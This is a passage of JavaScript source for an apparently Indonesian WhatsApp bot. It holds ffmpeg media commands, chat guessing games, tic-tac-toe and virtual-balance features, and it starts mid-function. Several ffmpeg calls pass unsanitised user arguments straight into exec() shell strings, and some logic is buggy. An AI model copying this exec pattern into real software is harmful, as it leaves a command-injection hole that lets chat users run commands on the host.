fs.unlinkSync(rname)
fs.unlinkSync(media3)
}
)
} else {
setReply('Reply audio!')
db.data.users[sender].limit -= 1 
}
break
case 'volvideo': {
    if (!args.join(" ")) {
        return reply(`Contoh: ${prefix + command} <volume> (misalnya: ${prefix + command} 10)`);
    }
hanz.editmsg(m.chat,'_Mohon Ditunggu Ini Membutuhkan Proses Agak Lama_',m)
    if (isQuotedVideo) {
        try {
            // Download dan simpan video dari pesan yang dikutip
            let media = await hanz.downloadAndSaveMediaMessage(quoted, "volume");
            let rname = getRandom('.mp4');

            // Menjalankan ffmpeg untuk mengubah volume
            exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
                // Hapus file media asli setelah pengolahan
                fs.unlinkSync(media);

                if (err) {
                    console.error(stderr); // Log error ke console untuk debugging
                    return reply('❌ Terjadi kesalahan saat memproses video. Silakan coba lagi.');
                }

                // Baca video yang telah diproses
                let jadie = fs.readFileSync(rname);

                // Kirim video kembali ke chat
                await hanz.sendMessage(m.chat, { video: jadie, mimetype: 'video/mp4' }, { quoted: m });

                // Hapus file video yang sudah dikirim
                fs.unlinkSync(rname);
            });
        } catch (error) {
            console.error(error); // Log kesalahan ke console untuk debugging
            return reply('❌ Terjadi kesalahan saat memproses video. Silakan coba lagi.');
        }
    } else {
        return reply('📹 Pastikan untuk mengutip video saat menggunakan perintah ini.');
    }
    break;
}
case 'cutaudio':
if (quoted < 30) return setReply('Audio harus lebih dari 30 detik');
if (isQuotedAudio || isAudio) {
    setReply('proses memotong video dengan format per 30 detik')
    let media = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));
    exec(`ffmpeg -i ${media} -f segment -segment_time 30 -reset_timestamps 1 output%03d.mp3`, async (err) => {
        if (err) {
            return setReply('Error processing audio');
        }
        let directoryPath = path.join();
        fs.readdir(directoryPath, async function (err, files) {
            if (err) return setReply('Error reading directory');
            var filteredArray = await files.filter(item => item.startsWith("output"));
            filteredArray.forEach(async function (file) {
                let sampah = fs.existsSync(file);
                if (sampah) {
                    await hanz.sendMessage(from, { audio: fs.readFileSync(file) });
                    fs.unlinkSync(file);
                }
            });
        });
    });
    await m.reply(`${gris}jika audio tidak bisa di putar silakan reply audio nya Dengan ketik .tovn${gris}`)
} else {
    setReply("Reply audio-nya");
}
break;

case 'cutvideo':
if(quoted < 30) return setReply('Vidio harus lebih dari 30 detik')
if (isQuotedVideo || isVideo) {
setReply('proses memotong video dengan format per 30 detik')
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
exec(`ffmpeg -i ${media} -c copy -map 0 -segment_time 00:00:30 -f segment -reset_timestamps 1 output%03d.mp4`, async (err) => {
let directoryPath = path.join();
 fs.readdir(directoryPath, async function (err, files) {
var filteredArray = await files.filter(item =>item.startsWith("output") )
filteredArray.forEach(async function (file) {
let sampah = fs.existsSync(file)
if(sampah){
 await hanz.sendMessage(from,{caption: `${file}`,video: fs.readFileSync(file)})
 fs.unlinkSync(file)
}
})
})
//----jangkrik-----\\
})
} else {
setReply("Reply videonya")
}
break
case 'terbalik':{
if (!isGroup) return onlyToko()
	if (/audio/.test(mime)){ 
	await loading()
	let media3 = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
	let rname = getRandom('.mp3')
	exec(`ffmpeg -i ${media3} -filter_complex "areverse" ${rname}`, async (err, stderr, stdout) => {
	if (err) return setReply('Error!')
	let jadie = fs.readFileSync(rname)
	await hanz.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4' }, {quoted: m})
	fs.unlinkSync(rname)
	fs.unlinkSync(media3)
	}
	)
	} else {
	setReply('Reply audio!')
	}
	}
	break
case 'resize':
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
if (isQuotedImage || isImage) {
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi" 
if (!q) return setReply(`Masukan ukuran panjang x lebar nya!, contoh ${prefix+command} 300x300`)

await loading()
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : false,thumbnail: thumb,sourceUrl: `https://wa.me/${nomerOwner}`
}}, mimetype: 'image/jpeg', image: buffer453, caption: `Done kak ${q}`}, { quoted: m })		
fs.unlinkSync(ran)
})
} else {
setReply("Reply Imagenya")
db.data.users[sender].limit -= 1 
}
break
case 'toonce':
            case 'toviewonce': {
                if (!quoted) return setReply(`Reply Image/Video`)
                if (/image/.test(mime)) {
                   let anuan = await hanz.downloadAndSaveMediaMessage(quoted)
                    hanz.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.succes,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                  let  anuanuan = await hanz.downloadAndSaveMediaMessage(quoted)
                    hanz.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.succes,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                let   bebasap = await hanz.downloadAndSaveMediaMessage(quoted)
                   hanz.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
	 // ========== FITUR GAME ==========//

case 'susunkata': {
    if (!isGame) return setReply(mess.game);
    if (!isGroup) return onlyToko();
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply(mess.limit);
    
    let poin = 1000;
    let timeout = 120000; // 2 menit
    let id = m.chat;

    // Jika sudah ada game di chat ini, jangan mulai yang baru
    if (id in hanz.susunkata) return setReply('Masih ada soal belum terjawab di chat ini');

    // Ambil soal dari database
    let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
    let caption = Ehztext(`*Soal :* ${json.soal}
*Tipe :* ${json.tipe}

Timeout *${(timeout / 1000).toFixed(2)} detik*
  Exp : +999
  Bonus : +${poin} Saldo
`.trim())
    hanz.susunkata[id] = [
        await setReply(caption),
        json,
        poin,
        setTimeout(async () => {
            // Jika waktu habis, kirimkan jawaban dan hapus game dari daftar
            let { proto, generateWAMessageFromContent } = require('baileys');
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({ text: null }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: `Game Susunkata` }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `Waktu game telah habis\nJawabannya adalah: ${json.jawaban}`,
                                subtitle: "Waktu habis",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [{
                                    "name": "quick_reply",
                                    "buttonParamsJson": `{"display_text":"SHOP","id":"${prefix}shopc"}`
                                }]
                            })
                        })
                    }
                }
            }, {});
            
            await hanz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
            delete hanz.susunkata[id]; // Hapus game dari daftar setelah timeout
        }, timeout)
    ];

    // Kurangi limit pengguna
    db.data.users[sender].glimit -= 1;
}
break;
case 'caklontong':{
if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 3000
let timeout = 120000
let tiketcoin = 1
let id = m.chat

if (id in hanz.caklontong) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = Ehztext(`*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Bonus : +${poin}
Tiketcoin : +${tiketcoin} `.trim())
hanz.caklontong[id] = [
await setReply(caption),
json, poin,
setTimeout(() => {
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}

${json.deskripsi}`)  
delete hanz.caklontong[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1
}
break
case 'family100': {
if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let winScore = 1000
let id = m.chat

if (id in hanz.family) return reply('Masih ada kuis yang belum terjawab di chat ini') 
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = Ehztext(`*Soal :* ${json.soal}

Terdapat *${json.jawaban.length}* jawaban${json.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}

+${winScore} Money tiap jawaban benar
`.trim())
hanz.family[id] = {
id,
msg: await m.reply(caption),
...json,
terjawab: Array.from(json.jawaban, () => false),
winScore,
}
db.data.users[sender].glimit -= 1
}
break

case 'tebakkimia':{
if (!isGame) return setReply(mess.game)
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 40000
	let poin = 1000
	let id = m.chat
	if (id in hanz.tebakkimia) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `*TEBAK KIMIA*
	Unsur: ${json.unsur}
	Soal: Singkatan atau lambang di atas adalah...
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	hanz.tebakkimia[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (hanz.tebakkimia[id]) 
user.balance -= 200
reply(`*GAME TEBAK KIMIA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete hanz.tebakkimia[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break
case 'tebaklirik':{
if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

//let but1 = [{"buttonId": `${prefix}tebaklirik`,"buttonText": {"displayText": `🎮 ᴍᴀɪɴ ʟᴀɢɪ`},"type": "RESPONSE"}]
if (id in hanz.tebaklirik) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = Ehztext(`*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim())
hanz.tebaklirik[id] = [
await setReply(caption),
json, poin,
setTimeout(() => {
if (hanz.tebaklirik[id]) 
setReply(`Waktu game telah habis
  Jawabannya adalah : ${json.jawaban}`)  
delete hanz.tebaklirik[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1
}
break
case 'siapaaku':
case 'siapakahaku':{
if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

//let but1 = [{"buttonId": `${prefix}siapaaku`,"buttonText": {"displayText": `🎮 ᴍᴀɪɴ ʟᴀɢɪ`},"type": "RESPONSE"}]
if (id in hanz.siapaaku) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = Ehztext(`*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim())
hanz.siapaaku[id] = [
await setReply(caption),
json, poin,
setTimeout(() => {
if (hanz.siapaaku[id]) 
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)  
delete hanz.siapaaku[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1
}
break
case 'tekateki':{
  if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

//let but1 = [{"buttonId": `${prefix}tekateki`,"buttonText": {"displayText": `🎮 ᴍᴀɪɴ ʟᴀɢɪ`},"type": "RESPONSE"}]
if (id in hanz.tekateki) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim()
hanz.tekateki[id] = [
await reply(caption),
json, poin,
setTimeout(() => {
if (hanz.tekateki[id]) 
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)  
delete hanz.tekateki[id]
 }, timeout)
 ]
}
db.data.users[sender].glimit -= 1
break
case 'tebakkata':{
  if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

//let but1 = [{"buttonId": `${prefix}tebakkata`,"buttonText": {"displayText": `🎮 ᴍᴀɪɴ ʟᴀɢɪ`},"type": "RESPONSE"}]
if (id in hanz.tebakkata) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = Ehztext(`*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim())
hanz.tebakkata[id] = [
await setReply(caption),
json, poin,
setTimeout(() => {
if (hanz.tebakkata[id]) 
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)
delete hanz.tebakkata[id]
 }, timeout)
 ]
}
db.data.users[sender].glimit -= 1
break
case 'tebaktebakan':{
  if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

if (id in hanz.tebaktebak) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = Ehztext(`*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim())
hanz.tebaktebak[id] = [
await setReply(caption),
json, poin,
setTimeout(() => {
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)  
delete hanz.tebaktebak[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1
}
break
case 'tebakgambar':{
  if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

//let but1 = [{"buttonId": `${prefix}tebakgambar`,"buttonText": {"displayText": `🎮 ᴍᴀɪɴ ʟᴀɢɪ`},"type": "RESPONSE"}]
if (id in hanz.tebakgambar) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let kentir = await getBuffer(json)       
let teks = Ehztext(`*Soal :* ${json.deskripsi}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim())
hanz.tebakgambar[id] = [
hanz.sendImage(from, json.img , teks, m),
json,
setTimeout(() => {
if (hanz.tebakgambar[id])
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)  
delete hanz.tebakgambar[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1
}
break
case 'tebaklagu':{
    if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
	let timeout = 60000
	let poin = 1200
	let id = m.chat
	if (id in hanz.tebaklagu) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/qisyana/scrape/main/tebaklagu.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
    
 var lagu = await hanz.sendMessage(from, {audio: {url: `${json.lagu}`, ptt: true, mimetype: 'audio/mpeg'}}, { quoted: m })
	let caption = `*TEBAK LAGU*
	Artis: ${json.artis}
	Soal: Judul lagu di atas adalah...
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	hanz.tebaklagu[id] = [
		await hanz.sendMessage(from, {text: caption}, {quoted: m}),
	json, poin,
	setTimeout(() => {
	if (hanz.tebaklagu[id]) 
     user.balance -= 200
reply(`*GAME TEBAK LAGU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete hanz.tebaklagu[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break
case 'tebakbendera':{
if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

//let but1 = [{"buttonId": `${prefix}tebakbendera`,"buttonText": {"displayText": `🎮 ᴍᴀɪɴ ʟᴀɢɪ`},"type": "RESPONSE"}]
if (id in hanz.tebakbendera) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let teks = Ehztext(`Bendera Apakah Ini ?

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim())
hanz.tebakbendera[id] = [
hanz.sendImage(from, json.img , teks, m),
json,
setTimeout(() => {
if (hanz.tebakbendera[id]) 
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.name}`)  
delete hanz.tebakbendera[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1 
}
break
case 'suitpvp': case 'suit': {
  if (!isGame) return setReply(mess.game)
      if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
	if (!isGroup) return onlyToko()
            hanz.suit = hanz.suit ? hanz.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(hanz.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) setReply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === sender) return setReply(`Tidak bisa bermain dengan diri sendiri !`)
	if (m.mentionedJid[0] === botNumber) return setReply (`Tidak bisa bermain dengan Bot !`)
            if (!m.mentionedJid[0]) return setReply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${nomerOwner}`, m.chat, { mentions: [nomerOwner + '@s.whatsapp.net'] })
            if (Object.values(hanz.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return setReply ( `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
            let id = 'suit_' + new Date() * 1
            let caption = Ehztext(`_*GAME SUIT PvP*_

@${sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`)
            hanz.suit[id] = {
            chat: await hanz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (hanz.suit[id]) hanz.sendText(m.chat, `_Waktu suit habis_`, m)
            delete hanz.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            db.data.users[sender].glimit -= 1
            break  
  case 'tictactoe': {
      if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
        	if (!isGroup) return setReply(mess.group)
            hanz.tictac = hanz.tictac ? hanz.tictac : {} 
 // if (roomf.x in hanz.tictac) return setReply('Masih ada game yang belum selesai di chat ini') 
            if (Object.values(hanz.tictac).find(roomf => roomf.id.startsWith('tictactoe') && [roomf.tictac.playerX, roomf.tictac.playerO].includes(sender))) return setReply ( 'Kamu masih didalam tictac')
            let roomf = Object.values(hanz.tictac).find(roomf => roomf.state === 'WAITING' && (q ? roomf.name === q : true))
            if (roomf) {
              roomf.o = m.chat                       
            setReply('Partner ditemukan!')
            
            roomf.tictac.playerO = sender
            roomf.state = 'PLAYING'
            let arr = roomf.tictac.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `roomf ID: ${roomf.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${roomf.tictac.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (roomf.x !== roomf.o) await hanz.sendText(roomf.x, str, m, { mentions: parseMention(str) } )
            await hanz.sendText(roomf.o, str, m, { mentions: parseMention(str) } )
            } else {
            roomf = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            tictac: new TicTacToe(sender, 'o'),
            state: 'WAITING'
            }
            if (q) roomf.name = q
            setReply('Menunggu partner' + (q ? ` mengetik command dibawah ini ${prefix}${command} ${q}` : ''))
            hanz.tictac[roomf.id] = roomf
            }
            }
    db.data.users[sender].glimit -= 1
            break 
    case 'delttc': case 'delttt': {
       	if (!isGroup) return setReply(mess.group)
            hanz.tictac = hanz.tictac ? hanz.tictac : {}
            try {
            if (hanz.tictac) {
            delete hanz.tictac
            hanz.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!hanz.tictac) {
            setReply(`Session TicTacToe🎮 tidak ada`)
            } else return '?'
            } catch (e) {
            setReply('rusak')
            }
            }
            break
case 'topbalance': case 'topglobal': {
    let uang = Object.values(db.data.users);
    uang.sort((a, b) => (a.balance < b.balance) ? 1 : -1);

    let top = '🏆 *「 TOP BALANCE GLOBAL 」* 🏆\n\n';
    var arrTop = [];
    var total = 15;
    
    // Jika jumlah pengguna lebih sedikit dari 15, tampilkan semua
    if (uang.length < 15) total = uang.length;

    // Looping untuk menambahkan top balance pengguna
    for (let i = 0; i < total; i++) {
        let positionEmoji = '';
        switch (i) {
            case 0: positionEmoji = '🥇'; break;
            case 1: positionEmoji = '🥈'; break;
            case 2: positionEmoji = '🥉'; break;
            default: positionEmoji = '⭐'; break;
        }

        // Menambahkan pengguna ke daftar dengan format menarik
        top += `${positionEmoji} *${i + 1}. wa.me/${uang[i].id.split("@")[0]}*\n💰 Balance: $${uang[i].balance.toLocaleString()}\n\n`;
        arrTop.push(uang[i].id);
    }

    // Menampilkan pesan dengan mention ke pengguna yang ada di daftar
    mentions(top, arrTop, true);
}
break;
case 'profil': 
    case 'me':{
    let ppimg = await hanz.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png');
    try {
        let sol = await hanz.fetchStatus(sender);
        var stst = sol.status === undefined ? '' : sol.status;
    } catch (err) {
        var stst = "";
    }
    let persenya = `${userPersen}`;
    let nana = `${userExp}/${requiredExp}`;

    let prmm = isPremium ? (isOwner ? 'Premium' : user ? user.premiumDate : '') : 'Not Premium';
    let teks = `*]────「 Profile User 」────[*
    
    🆔 Nama : ${pushname} 
    💳 Saldo  : Rp ${db.data.users[sender].balance.toLocaleString()}
    ✅ Verified : ${userVerified}
    📇 Status : ${isPremium ? 'Premium' : 'Free'}
    🧬 Level : ${userLevel}
    🔰 Grade : ${userLeveling(`${db.data.users[sender].level}`)}
    ⚡ Exp : ${userXp(userPersen)} ${persenya.split(".")[0]}%
    ♻️ Total Exp : ${nana}
    📟 User Hit : ${db.data.users[sender].hit}
    🤖 Status Bot : ${isOwner ? 'Owner' : 'User'}
    🕔 Expired : ${prmm}
    📉 Limit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}
    📈 Limit Game : ${isPremium ? 'Unlimited' : `${db.data.users[sender].glimit}/${gcounti.user}`}
    📲 No : wa.me/${sender.split("@")[0]}
    🧸 Bio : ${stst}`;

    let its = await getBuffer(ppimg);

    const canvacord = require("canvacord");
let image3 = new canvacord.Rank()
    .setAvatar(its)
    .setCurrentXP(Math.floor(userExp)) // Pastikan 'math()' dikoreksi menjadi 'Math.floor()'
    .setRequiredXP(requiredExp)
    .setStatus("online")
    .setProgressBar("#FFFFFF", "COLOR") // Depan putih (#FFFFFF), belakang biru (#0000FF)
    .setBackground("COLOR", "#A0C8D0") // Mengubah background menjadi biru (#0000FF)
    .setCustomStatusColor("#ff1a8c")
    .setUsername(`EXP: ${persenya.split(".")[0]}%,`)
    .setLevel(userLevel)
    .setRank(4)
    .setOverlay("#A4D3EE") // Overlay menjadi putih (#FFFFFF)
    .setDiscriminator("0007");

    let foto = await getRandom(".png");
    image3.build()
        .then(async data => {
            await canvacord.write(data, foto);
            let gambar = await fs.readFileSync(foto);
            hanz.sendMessage(from, { caption: teks, image: gambar }, { quoted: m });
            await fs.unlinkSync(foto);
        });
}
break;
case 'tf' :
	{
    try{
	if(!q) return setReply(`Masukan angka\nContoh: .transfer 100`)
   if(!mentionByReply) return setReply("Reply targetnya")
         if(budy.includes('-') || budy.includes('+')) return setReply ("Harus angka blok")
	if (isNaN(q)) return setReply(`Masukan angka\nContoh: .transfer 100`)
	let ane = q
      if(100 > ane) return reply('Minimal transaksi 100 rupiah')
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi`)
    	db.data.users[mentionByReply].balance += parseInt(ane)
	db.data.users[sender].balance -= parseInt(ane)
	setReply(`Berhasil mentransfer saldo ke nomer ${mentionByReply.split("@")[0]} sebesar Rp.${Number(q).toLocaleString()}`)
	}catch(err){
      setReply ('User tersebut belum terdaftar di database bot, silahkan suruh ketik .menu terlebih dahulu')
  }
  }
	break
case 'claim':
case 'claimgame':{
if (!isGroup) return onlyToko()
const free = 5000
const prem = 10000
const moneyfree = 5000
const moneyprem = 10000
const timeout = 86400000
let time = global.db.data.users[m.sender].lastclaim + 86400000
 if (new Date - global.db.data.users[m.sender].lastclaim < 86400000) return setReply( `Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${hanz.msToTime(time - new Date())} lagi`)
 global.db.data.users[m.sender].exp += isPremium ? prem : free
 global.db.data.users[m.sender].balance += isPremium ? moneyprem : moneyfree
let hore = Ehztext(`Selamat kamu mendapatkan:\n\n+${isPremium? prem : free} Exp\n+${isPremium? moneyprem : moneyfree} Balance`)
setReply(hore)
  global.db.data.users[m.sender].lastclaim = new Date * 1
} 
break  
 case 'limit':
case 'ceklimit': 
    if (mentionByReply) {
        let nomer = mentionByReply.split("@")[0];
        setReply(`
*🔖 ${await hanz.getName(mentionByReply)}'s Info 🔖*
📊 *Limit*: ${isPremium ? 'Unlimited 💎' : `${db.data.users[mentionByReply].limit}/${limitCount}`} ⚡
🎮 *Limit Game*: ${isPremium ? 'Unlimited 💎' : `${db.data.users[mentionByReply].glimit}/${gcount}`} 🎲
💰 *Saldo*: Rp ${db.data.users[mentionByReply].balance.toLocaleString()}\n
⚠️ *Tips*: Kamu dapat membeli limit dengan perintah:
  - ${prefix}buylimit untuk membeli limit
  - ${prefix}buyglimit untuk membeli game limit
Atau ketik ${prefix}buyprem untuk membeli unlimited limit 💎
        `);
    } else {   
        setReply(`
*🔖 ${pushname}'s Info 🔖*
📊 *Limit*: ${isPremium ? 'Unlimited 💎' : `${db.data.users[sender].limit}/${limitCount}`} ⚡
🎮 *Limit Game*: ${isPremium ? 'Unlimited 💎' : `${db.data.users[sender].glimit}/${gcount}`} 🎲
💰 *Saldo*: Rp ${db.data.users[sender].balance.toLocaleString()}\n
⚠️ *Tips*: Kamu dapat membeli limit dengan perintah:
   - ${prefix}buylimit untuk membeli limit
   - ${prefix}buyglimit untuk membeli game limit
Atau ketik ${prefix}buyprem untuk membeli unlimited limit 💎
        `);
    }
break;
case 'shopc': {
    let teks = `
    *🛒────「 SHOP 」────🛒*

    Halo, ${pushname} 👋
    💰 *Saldo Kamu*: Rp ${db.data.users[sender].balance.toLocaleString()}

    📋 *List Harga*:
    1️⃣ *1 Limit*: Rp 1,000
    2️⃣ *1 Limit Game*: Rp 700

    📝 *Cara Pembelian*:
    - Untuk membeli *Limit*, ketik: 
      ${prefix}buylimit [jumlah limit]
